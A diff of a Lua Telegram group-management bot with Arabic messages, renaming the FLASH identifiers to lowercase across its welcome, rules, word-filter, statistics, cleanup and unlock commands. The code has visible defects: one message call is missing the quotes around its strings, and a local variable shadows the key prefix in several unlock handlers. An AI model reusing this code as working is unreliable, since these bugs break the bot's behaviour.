-FLASHdx1:del(FLASH..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء حفظ الترحيب ،", 1, "md")
+flashdx1:del(flash..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-FLASHdx1:del(FLASH..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
-FLASHdx1:set(FLASH..'get:welcome'..msg.chat_id_,text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الترحيب ،\n", 1, "md")
+flashdx1:del(flash..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx1:set(flash..'get:welcome'..msg.chat_id_,text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الترحيب ،\n", 1, "md")
 return false   
 end
-if text and text:match("^ضع ترحيب$") and FLASH11(msg) or text and text:match("^وضع ترحيب$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي الترحيب الان :\n❅∫ يمكن اضافه للترحيب ما يلي :\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `name` ~ داله عرض الاسم\n- `@user` ~ داله عرض المعرف\n❅∫ فقط اضغط على الداله سيتم نسخها\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ للخروج ارسل  ( الغاء )\n ', 1, 'md')
-FLASHdx1:set(FLASH..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
+if text and text:match("^ضع ترحيب$") and flash11(msg) or text and text:match("^وضع ترحيب$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي الترحيب الان :\n❅∫ يمكن اضافه للترحيب ما يلي :\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `name` ~ داله عرض الاسم\n- `@user` ~ داله عرض المعرف\n❅∫ فقط اضغط على الداله سيتم نسخها\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ للخروج ارسل  ( الغاء )\n ', 1, 'md')
+flashdx1:set(flash..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
-if text and text:match("^حذف الترحيب$") and FLASH11(msg) or text and text:match("^مسح الترحيب$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حذف الترحيب ، ', 1, 'md')
-FLASHdx1:del(FLASH..'get:welcome'..msg.chat_id_)
+if text and text:match("^حذف الترحيب$") and flash11(msg) or text and text:match("^مسح الترحيب$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حذف الترحيب ، ', 1, 'md')
+flashdx1:del(flash..'get:welcome'..msg.chat_id_)
 end
-if text and text:match("^جلب الترحيب$") and FLASH11(msg) or text and text:match("^الترحيب$") and FLASH11(msg) then
-local wel = FLASHdx1:get(FLASH..'get:welcome'..msg.chat_id_)
+if text and text:match("^جلب الترحيب$") and flash11(msg) or text and text:match("^الترحيب$") and flash11(msg) then
+local wel = flashdx1:get(flash..'get:welcome'..msg.chat_id_)
 if wel then
-FLASHdx(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم وضع الترحيب ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم وضع الترحيب ، ', 1, 'md')
 end end end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
+--     By Developer flash     -- 
+if flashdx1:get(flash..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
 if text == 'الغاء' then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ القوانين ', 1, 'md')
-FLASHdx1:del(FLASH..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ القوانين ', 1, 'md')
+flashdx1:del(flash..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-FLASHdx1:del(FLASH..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
-FLASHdx1:set(FLASH..'bot:rules'..msg.chat_id_,text)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ القوانين ', 1, 'md')
+flashdx1:del(flash..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx1:set(flash..'bot:rules'..msg.chat_id_,text)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ القوانين ', 1, 'md')
 return false   
 end
-if text and text:match("^ضع قوانين$") and FLASH11(msg) or text and text:match("^وضع قوانين$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي القوانين الان ،\n❅∫ للرجوع ارسل { الغاء } ', 1, 'md')
-FLASHdx1:set(FLASH..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
+if text and text:match("^ضع قوانين$") and flash11(msg) or text and text:match("^وضع قوانين$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي القوانين الان ،\n❅∫ للرجوع ارسل { الغاء } ', 1, 'md')
+flashdx1:set(flash..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
-if FLASHdx1:get(FLASH..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
+if flashdx1:get(flash..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
 if text == 'الغاء' then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الوصف ', 1, 'md')
-FLASHdx1:del(FLASH..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الوصف ', 1, 'md')
+flashdx1:del(flash..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-FLASHdx1:del(FLASH..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx1:del(flash..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
 https.request('https://api.telegram.org/bot'..tokenbot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الوصف ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الوصف ، ', 1, 'md')
 return false  
 end
-if text and text:match("^ضع وصف$") and FLASH11(msg) or text and text:match("^وضع وصف$") and FLASH11(msg) then  
-FLASHdx1:set(FLASH..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي الوصف الان ،\n❅∫ للرجوع ارسل { الغاء } ', 1, 'md')
+if text and text:match("^ضع وصف$") and flash11(msg) or text and text:match("^وضع وصف$") and flash11(msg) then  
+flashdx1:set(flash..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي الوصف الان ،\n❅∫ للرجوع ارسل { الغاء } ', 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^منع (.*)$") then
 local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
 local filterss = {string.match(text, "^(منع) (.*)$")}
 local name = string.sub(filters[2] or filterss[2], 1, 50)
-local hash = (FLASH..'bot:filters:'..msg.chat_id_)
-FLASHdx1:hset(hash, name,'newword')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم منعها ،", 1, 'md')
+local hash = (flash..'bot:filters:'..msg.chat_id_)
+flashdx1:hset(hash, name,'newword')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم منعها ،", 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^الغاء منع (.*)$") then
 local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
 local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
 local name = string.sub(rws[2] or rwss[2], 1, 50)
 local cti = msg.chat_id_
-local hash = (FLASH..'bot:filters:'..msg.chat_id_)
-if not FLASHdx1:hget(FLASH..hash, name) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ هي غير ممنوعه في المجموعه ،", 1, 'md')
+local hash = (flash..'bot:filters:'..msg.chat_id_)
+if not flashdx1:hget(flash..hash, name) then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ هي غير ممنوعه في المجموعه ،", 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم الغاء منعها ،", 1, 'md')
-FLASHdx1:hdel(hash, name)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم الغاء منعها ،", 1, 'md')
+flashdx1:hdel(hash, name)
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^فلتر عام (.*)$") then
 local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
 local name = string.sub(filterss[2], 1, 50)
-local hash = (FLASH..'bot:freewords:')
-FLASHdx1:hset(hash, name,'newword')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم منعها عام ،", 1, 'md')
+local hash = (flash..'bot:freewords:')
+flashdx1:hset(hash, name,'newword')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم منعها عام ،", 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^الغاء منع عام (.*)$") then
 local rwss = {string.match(text, "^(الغاء منع عام) (.*)$")}
 local name = string.sub(rwss[2], 1, 50)
 local cti = msg.chat_id_
-local hash = (FLASH..'bot:freewords:')
-if not FLASHdx1:hget(hash, name)then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ هي ليست ممنوعه عام ،", 1, 'html')
+local hash = (flash..'bot:freewords:')
+if not flashdx1:hget(hash, name)then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ هي ليست ممنوعه عام ،", 1, 'html')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم منعها عام ،", 1, 'html')
-FLASHdx1:hdel(hash, name)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ الكلمه ( "..name.." )\n❅∫ تم منعها عام ،", 1, 'html')
+flashdx1:hdel(hash, name)
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^الاحصائيات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
-local users = FLASHdx1:scard(FLASH.."bot:userss")
-local allmgs = FLASHdx1:get(FLASH.."bot:allmsgs")
-if FLASHdx1:get(FLASH..'autoleave') == "On" then
+local gps = flashdx1:scard(flash.."bot:groups")
+local users = flashdx1:scard(flash.."bot:userss")
+local allmgs = flashdx1:get(flash.."bot:allmsgs")
+if flashdx1:get(flash..'autoleave') == "On" then
 autoleavear = "مفعل 🌟"
-elseif FLASHdx1:get(FLASH..'autoleave') == "Off" then
+elseif flashdx1:get(flash..'autoleave') == "Off" then
 autoleavear = "معطل 🛢"
-elseif not FLASHdx1:get(FLASH..'autoleave') then
+elseif not flashdx1:get(flash..'autoleave') then
 autoleavear = "معطل 🛢"
 end
-if FLASHdx1:get(FLASH..'clerk') == "On" then
+if flashdx1:get(flash..'clerk') == "On" then
 clerkar = "مفعل 🌟"
-elseif FLASHdx1:get(FLASH..'clerk') == "Off" then
+elseif flashdx1:get(flash..'clerk') == "Off" then
 clerkar = "مفعل 🛢"
-elseif not FLASHdx1:get(FLASH..'clerk') then
+elseif not flashdx1:get(flash..'clerk') then
 clerkar = "مفعل 🌟"
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ احصائيات البوت ، \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n❅∫ عدد الجروبات ، '..gps..'\n❅∫ عدد الاعضاء ، '..users..' \n❅∫ عدد كل رسائل المجموعات ، '..allmgs..'\n❅∫ المغادره التلقائيه ، '..autoleavear..'\n❅∫ رساله ستارت ، '..clerkar, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ احصائيات البوت ، \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n❅∫ عدد الجروبات ، '..gps..'\n❅∫ عدد الاعضاء ، '..users..' \n❅∫ عدد كل رسائل المجموعات ، '..allmgs..'\n❅∫ المغادره التلقائيه ، '..autoleavear..'\n❅∫ رساله ستارت ، '..clerkar, 1, 'md')
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == "تنظيف الجروبات" and is_sudo(msg) then 
-local group = FLASHdx1:smembers(FLASH.."bot:groups")
+local group = flashdx1:smembers(flash.."bot:groups")
 local w = 0
 local q = 0
 for i = 1, #group do
@@ -7339,77 +7339,77 @@ tdcli_function({ID='GetChat',chat_id_ = group[i]
 },function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
 print('\27[30;34m»» THE BOT IS NOT ADMIN ↓\n»» '..group[i]..'\n\27[1;37m')
-FLASHdx1:srem(FLASH.."bot:groups",group[i]) 
+flashdx1:srem(flash.."bot:groups",group[i]) 
 changeChatMemberStatus(group[i], bot_id, "Left")
 w = w + 1
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-FLASHdx1:srem( FLASH.."bot:groups",group[i]) 
+flashdx1:srem( flash.."bot:groups",group[i]) 
 q = q + 1
 print('\27[30;35m»» THE BOT IS LEFT GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
-FLASHdx1:srem( FLASH.."bot:groups",group[i]) 
+flashdx1:srem( flash.."bot:groups",group[i]) 
 q = q + 1
 print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
 end
 if data and data.code_ and data.code_ == 400 then
-FLASHdx1:srem( FLASH.."bot:groups",group[i]) 
+flashdx1:srem( flash.."bot:groups",group[i]) 
 w = w + 1
 end
 if #group == i then 
 if (w + q) == 0 then
-FLASHdx(msg.chat_id_, msg.id_, 1, ❅∫ لا يوجد كروبات وهميه ،\n , 1,  md )
+flashdx(msg.chat_id_, msg.id_, 1, ❅∫ لا يوجد كروبات وهميه ،\n , 1,  md )
 else
-local FLASHddx2 = (w + q)
-local FLASHdx3 = #group - FLASHddx2
+local flashddx2 = (w + q)
+local flashdx3 = #group - flashddx2
 if q == 0 then
-FLASHddx2 = ''
+flashddx2 = ''
 else
-FLASHddx2 = '\n*❅∫ تم مسح ⌯» { '..q..' } مجموعه من البوت*' 
+flashddx2 = '\n*❅∫ تم مسح ⌯» { '..q..' } مجموعه من البوت*' 
 end
 if w == 0 then
-FLASHddx1 = ''
+flashddx1 = ''
 else
-FLASHddx1 = '\n*❅∫ تم مسح ⌯» { '..w..' } جروب بسبب تنزيل البوت عضو*'
+flashddx1 = '\n*❅∫ تم مسح ⌯» { '..w..' } جروب بسبب تنزيل البوت عضو*'
 end
-FLASHdx(msg.chat_id_, msg.id_, 1,'*❅∫ عدد الجروبات الان ⌯» { '..#group..' }*'..FLASHddx1..''..FLASHddx2..'\n*❅∫ العدد الحقيقي الان ⌯» ( '..FLASHdx3..' ) جروب*\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,'*❅∫ عدد الجروبات الان ⌯» { '..#group..' }*'..flashddx1..''..flashddx2..'\n*❅∫ العدد الحقيقي الان ⌯» ( '..flashdx3..' ) جروب*\n', 1, 'md')
 end end end,nil) end
 return false
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text == "تنظيف ميديا" or text == "تنظيف الميديا" and FLASH11(msg) then   
-FLASH = {[0]= msg.id_}
+if text == "تنظيف ميديا" or text == "تنظيف الميديا" and flash11(msg) then   
+flash = {[0]= msg.id_}
 local Message = msg.id_
 for i=1,100 do
 Message = Message - 1048576
-FLASH[i] = Message
+flash[i] = Message
 end
-tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = FLASH},function(arg,data)
+tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = flash},function(arg,data)
 new = 0
-FLASH2 = {}
+flash2 = {}
 for i=0 ,data.total_count_ do
 if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
-FLASH2[new] = data.messages_[i].id_
+flash2[new] = data.messages_[i].id_
 new = new + 1
 end end
-delete_msg(msg.chat_id_,FLASH2)
+delete_msg(msg.chat_id_,flash2)
 end,nil)  
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنظيف 100 من الميديا ،", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنظيف 100 من الميديا ،", 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^اسم المجموعه$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ اسم المجموعه {"..title_name(msg.chat_id_).."}", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ اسم المجموعه {"..title_name(msg.chat_id_).."}", 1, 'md')
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^تنظيف الرسائل$") and is_sudo(msg) then
-FLASHdx1:del(FLASH.."bot:allmsgs")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تنظيف عدد رسائل الجروبات ', 'md')
+flashdx1:del(flash.."bot:allmsgs")
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تنظيف عدد رسائل الجروبات ', 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^فتح (.*)$") and FLASH11(msg) then
+if text and text:match("^فتح (.*)$") and flash11(msg) then
 if is_leaderid(msg.sender_user_id_) then
 tar = 'المطور 🌟'
 elseif is_sudoid(msg.sender_user_id_) then
@@ -7431,90 +7431,90 @@ tar = 'الادمن 🥈'
 end
 local unlockpts = {string.match(text, "^(فتح) (.*)$")}
 if unlockpts[2] == "التعديل" then
-if FLASHdx1:get(FLASH..'editmsg'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التعديل  \n❅∫ بواسطة ('..msg.sender_user_id_..') ' 
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'editmsg'..msg.chat_id_)
+if flashdx1:get(flash..'editmsg'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التعديل  \n❅∫ بواسطة ('..msg.sender_user_id_..') ' 
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'editmsg'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التعديل سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التعديل سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "الفارسيه" then
-if FLASHdx1:get(FLASH..'farsi'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفارسيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'farsi'..msg.chat_id_)
+if flashdx1:get(flash..'farsi'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفارسيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'farsi'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفارسيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفارسيه سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "الفارسيه بالطرد" then
-if FLASHdx1:get(FLASH..'farsiban'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفارسيه بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 63, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'farsiban'..msg.chat_id_)
+if flashdx1:get(flash..'farsiban'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفارسيه بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 63, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'farsiban'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفارسيه بالطرد سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفارسيه بالطرد سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "الشارحه" then
-if FLASHdx1:get(FLASH..'bot:cmds'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الشارحه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:cmds'..msg.chat_id_)
+if flashdx1:get(flash..'bot:cmds'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الشارحه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:cmds'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الشارحه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الشارحه سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "البوتات" then
-if FLASHdx1:get(FLASH..'bot:bots:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » البوتات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:bots:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:bots:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » البوتات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:bots:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » البوتات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » البوتات سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "البوتات بالطرد" then
-if FLASHdx1:get(FLASH..'bot:bots:ban'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » البوتات بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 62, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:bots:ban'..msg.chat_id_)
+if flashdx1:get(flash..'bot:bots:ban'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » البوتات بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 62, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:bots:ban'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » البوتات بالطرد سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » البوتات بالطرد سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "البوتات بالتقييد" then
-if FLASHdx1:get(FLASH..'keed_bots'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » البوتات بالتقييد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 64, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'keed_bots'..msg.chat_id_)
+if flashdx1:get(flash..'keed_bots'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » البوتات بالتقييد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 64, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'keed_bots'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » البوتات بالتقييد سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » البوتات بالتقييد سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "التكرار" then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then 
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التكرار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'anti-flood:'..msg.chat_id_)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then 
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التكرار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'anti-flood:'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التكرار سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التكرار سابقا ،', 1, 'md')
 end end
 if unlockpts[2] == "التثبيت" then
-if FLASHdx1:get(FLASH..'bot:pin:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التثبيت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:pin:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:pin:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التثبيت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:pin:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التثبيت سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التثبيت سابقا ،', 1, 'md')
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^قفل الكل بالساعات (%d+)$") and FLASH11(msg) then
+if text and text:match("^قفل الكل بالساعات (%d+)$") and flash11(msg) then
 local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
 local hour = string.gsub(mutept[1], 'h', '')
 local num1 = tonumber(hour) * 3600
 local num = tonumber(num1)
-FLASHdx1:setex(FLASH..'bot:muteall'..msg.chat_id_, num, true)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم قفل الكل لمده "..mutept[1].." ساعه ،", 'md')
